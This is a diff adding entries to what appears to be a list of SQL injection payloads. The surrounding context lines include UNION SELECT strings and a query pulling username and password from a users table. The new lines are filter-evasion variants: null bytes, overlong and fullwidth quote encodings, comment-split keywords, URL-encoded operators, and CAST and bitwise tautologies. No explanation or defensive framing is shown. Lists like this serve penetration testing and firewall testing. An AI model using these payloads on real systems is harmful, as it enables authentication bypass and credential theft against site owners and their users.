@@ -35,3 +35,17 @@ UNION/*!*/SELECT
 ' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--
 1'+(s]elect+cOnCat(username,0x3a,password)+fRoM+users)+'
 '||(SeLEcT 1 FrOM DuAl WheRE 1=1)||'
+' OR 1=1;%00
+'%c0%27 OR 1=1--
+' OR/**_**/1=1--
+' O%52 1=1--
+'%ef%bc%87 OR 1=1--
+' OR 1=CAST(1 AS INT)--
+' OR 1=CONVERT(INT,1)--
+1;SELECT/**/CASE WHEN 1=1 THEN 1 ELSE 0 END--
+'+OR+1=1--+--
+' OR 1^0=1--
+' OR 1&1=1--
+' %26%26 1=1--
+' || 1=CAST('1' AS INT)--
+
